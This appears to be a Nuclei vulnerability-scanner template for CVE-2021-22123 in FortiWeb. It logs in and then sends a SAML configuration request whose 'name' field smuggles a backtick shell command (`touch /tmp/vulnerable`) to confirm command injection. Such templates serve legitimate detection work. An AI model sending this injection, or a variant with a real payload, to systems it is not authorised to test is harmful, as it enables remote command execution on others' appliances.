id: CVE-2021-22123
info:
  author: dorkerdevil
  description: OS command injection vulnerability in FortiWeb's management interface
    (version 6.3.11 and prior) can allow a remote, authenticated attacker to execute
    arbitrary commands on the system, via the SAML server configuration page.
  name: FortiWeb - OS command injection (Authenticated)
  reference: https://nvd.nist.gov/vuln/detail/CVE-2021-22123
  severity: critical
  tags: cve,cve2021,auth,fortiweb,forti
requests:
- cookie-reuse: true
  matchers:
  - type: word
    words:
    - '{"errcode":'
  - status:
    - 500
    type: status
  matchers-condition: and
  raw:
  - 'POST /logincheck HTTP/1.1

    Host: {{Hostname}}


    ajax=1&username={{username}}&secretkey={{password}}&redir=%2F

    '
  - "POST /api/v2.0/user/remoteserver.saml HTTP/1.1\nHost: {{Hostname}}\nReferer:\
    \ {{RootURL}}/root/user/remote-user/saml-user/\nX-Csrftoken: {{csrf_token}}\n\
    Content-Type: multipart/form-data; boundary=---------------------------94351131111899571381631694412\n\
    Origin: {{BaseURL}}\n\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"q_type\"\n1\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"name\"\n`touch /tmp/vulnerable`\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"entityID\"\ntest\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"service-path\"\n/saml.sso\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"session-lifetime\"\n8\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"session-timeout\"\n30\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"sso-bind\"\npost\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"sso-bind_val\"\n1\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"sso-path\"\n/SAML2/POST\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"slo-bind\"\npost\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"slo-bind_val\"\n1\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"slo-path\"\n/SLO/POST\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"flag\"\n0\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"enforce-signing\"\ndisable\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"enforce-signing_val\"\n0\n-----------------------------94351131111899571381631694412\n\
    Content-Disposition: form-data; name=\"metafile\"; filename=\"test.xml\"\nContent-Type:\
    \ text/xml\n<?xml version=\"1.0\"?>\n<md:EntityDescriptor xmlns:md=\"urn:oasis:names:tc:SAML:2.0:metadata\"\
    \ validUntil=\"2021-06-12T16:54:31Z\" cacheDuration=\"PT1623948871S\" entityID=\"\
    test\">\n<md:IDPSSODescriptor WantAuthnRequestsSigned=\"false\" protocolSupportEnumeration=\"\
    urn:oasis:names:tc:SAML:2.0:protocol\">\n<md:KeyDescriptor use=\"signing\">\n\
    <ds:KeyInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n<ds:X509Data>\n\
    <ds:X509Certificate>test</ds:X509Certificate>\n</ds:X509Data>\n</ds:KeyInfo>\n\
    </md:KeyDescriptor>\n<md:KeyDescriptor use=\"encryption\">\n<ds:KeyInfo xmlns:ds=\"\
    http://www.w3.org/2000/09/xmldsig#\">\n<ds:X509Data>\n<ds:X509Certificate>test</ds:X509Certificate>\n\
    </ds:X509Data>\n</ds:KeyInfo>\n</md:KeyDescriptor>\n<md:NameIDFormat>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</md:NameIDFormat>\n\
    <md:SingleSignOnService Binding=\"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect\"\
    \ Location=\"test\"/>\n</md:IDPSSODescriptor>\n</md:EntityDescriptor>\n  -----------------------------94351131111899571381631694412--\n"
